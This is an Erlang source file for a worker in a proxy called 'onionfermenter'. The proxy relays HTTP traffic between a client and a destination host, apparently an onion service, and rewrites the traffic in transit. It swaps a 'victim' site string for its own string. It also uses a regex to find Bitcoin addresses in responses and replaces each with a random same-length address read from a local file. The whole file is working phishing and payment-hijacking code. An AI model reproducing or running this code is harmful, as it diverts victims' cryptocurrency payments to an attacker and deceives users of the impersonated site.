-module(onionfermenter_worker_server).
-behaviour(gen_server).

-export([start_link/6]).
-export([send/2]). % used to send messages to connected client through the server
-export([close/2]). % used to indicate worker that connector socket has been closed
-export([init/1, handle_call/3, handle_cast/2, handle_info/2, code_change/3, terminate/2]).

-record(state, {supervisor, uid, socket, logger, destinationhost, replace, connector, btcaddresses, dstport, connectorbuf = <<>>, sourcebuf = <<>>}).


start_link(Socket, Logger, DestinationHost, Replace, DstPort, Supervisor) ->
    gen_server:start_link(?MODULE, [Socket, Logger, DestinationHost, Replace, DstPort, Supervisor], []).

init([Socket, Logger, DestinationHost, Replace, DstPort, Supervisor]) ->
    %% Start accepting requests
    %% We must cast this to the worker's process, as it blocks it.
    gen_server:cast(self(), accept),
    {ok, #state{uid=generate_uid(), socket=Socket, logger=Logger, destinationhost=DestinationHost, replace=Replace, dstport=DstPort, supervisor=Supervisor}}.

% handle start message from self
handle_cast(accept, State) ->
    BtcAddresses = readfile("BTC-ADDRESSES.txt"), % read file with BTC addresses into memory
    {ok, AcceptSocket} = gen_tcp:accept(State#state.socket),
    onionfermenter_sup:start_socket(State#state.supervisor), % start a new listener to replace this one
    {ok, Connector} = onionfermenter_connector_server:start_link(self(), State#state.destinationhost, State#state.dstport), % start connector for this worker
    {noreply, #state{uid=State#state.uid, socket=AcceptSocket, logger=State#state.logger, destinationhost=State#state.destinationhost, replace=State#state.replace, connector=Connector, btcaddresses=BtcAddresses }};
% handle message from connector
handle_cast({send, Msg}, State) ->

    % concat buf and msg
    Buf = State#state.connectorbuf,
    Alldata = <<Buf/binary, Msg/binary>>,

    % try to read http msg from the concat
    Ret = http_parser:read_http_msg(Alldata),

    % check if full http message found or not
    Remaining = case Ret of
        { HttpMessage, Rest } ->
            {VictimString, OFString} = State#state.replace,
            BtcReplacedMessage = replaceBtcAddresses(HttpMessage, State#state.btcaddresses, State#state.logger, State#state.uid), % replace all btc addresses in msg
            gen_tcp:send(State#state.socket, replace(BtcReplacedMessage, VictimString, OFString)), % send tampered msg to source
            Rest;
        more -> Alldata % no packet found, wait for more
    end,
    {noreply, State#state{connectorbuf=Remaining}};
% handle closed connector socket to DestinationHost
handle_cast({close, _Reason}, State) ->
    {stop, normal, State};
handle_cast(_, State) ->
    {noreply, State}.


% API function to send message to connected client
send(Pid, Msg) ->
    gen_server:cast(Pid, {send, Msg}).

% API function to notify worker that connector socket has been closed or there has been an error
close(Pid, Reason) ->
    gen_server:cast(Pid, {close, Reason}).

% handle messages from source
handle_info({tcp, Socket, Msg}, State) ->
    ok = inet:setopts(Socket, [{active, once}]), % set as active once again
    %onionfermenter_logger_server:log(State#state.logger, State#state.uid, Msg), % send unchanged to logger

    % concat buf and msg
    Buf = State#state.sourcebuf,
    Alldata = <<Buf/binary, Msg/binary>>,

    % try to read http msg from the concat
    Ret = http_parser:read_http_msg(Alldata),

    % check if full http message found or not
    Remaining = case Ret of
        { HttpMessage, Rest } ->
            {VictimString, OFString} = State#state.replace,
            onionfermenter_connector_server:send(State#state.connector, replace(HttpMessage, OFString, VictimString)), % send replaced to connector
            Rest;
        more -> Alldata % no packet found, wait for more
    end,
    {noreply, State#state{sourcebuf=Remaining}};
% let connector know and exit when socket closed
handle_info({tcp_closed, _Socket}, State) ->
    onionfermenter_connector_server:close(State#state.connector, tcp_closed),
    {stop, normal, State};
handle_info({tcp_error, _Socket, _}, State) ->
    onionfermenter_connector_server:close(State#state.connector, tcp_error),
    {stop, normal, State};
handle_info(E, State) ->
    io:fwrite("unexpected: ~p~n", [E]),
    {noreply, State}.

handle_call(_E, _From, State) -> {noreply, State}.
terminate(_Reason, _Tab) -> ok.
code_change(_OldVersion, Tab, _Extra) -> {ok, Tab}.


%%% helpers

% generate UID for worker
generate_uid() ->
    base64:encode_to_string(crypto:strong_rand_bytes(8)).

% replace string in binary
replace(Msg, StrToReplace, Str) ->
    binary:replace(Msg, list_to_binary(StrToReplace), list_to_binary(Str), [global]).

% replace all btc addresses in binary
replaceBtcAddresses(Msg, Addresses, Logger, Uid) ->
    % get all btc addresses in msg
    Ret = re:run(Msg, "(?:bc1|bc1p|[13])[a-zA-HJ-NP-Z0-9]{25,39}[^a-zA-Z0-9\/\.]",  [global, {capture, all, list}]),

    % no match, return unedited
    case Ret of
        nomatch -> Msg;
        {match, Matches} ->

            % remove duplicate matches
            Set = sets:from_list(Matches),
            UniqMatches = sets:to_list(Set),

            % for each address replace with random one in the btcaddesses
            % return final message
            lists:foldl(fun(N, Acc) ->

                % only addresses of same length are valid candidates
                ValidAddressCandidates = lists:filter(fun(A) -> string:length(A) == string:length(N) end, Addresses),

                case lists:flatlength(ValidAddressCandidates) of
                    0 -> Acc; % do nothing if there are no addresses of valid length
                    _ ->
                        Addr = pickrandom(ValidAddressCandidates),
                        %onionfermenter_logger_server:log(Logger, Uid, list_to_binary("Replaced " ++ N ++ " with " ++ Addr ++ "\n")), % log changes
                        replace(Acc, N, Addr)
                    end
              end, Msg, UniqMatches)
    end.

% pick random element from list
pickrandom(List) ->
    lists:nth(rand:uniform(length(List)), List).

% read file with btc addresses into list
readfile(FileName) ->
  {ok, Binary} = file:read_file(FileName),
  string:tokens(erlang:binary_to_list(Binary), "\n").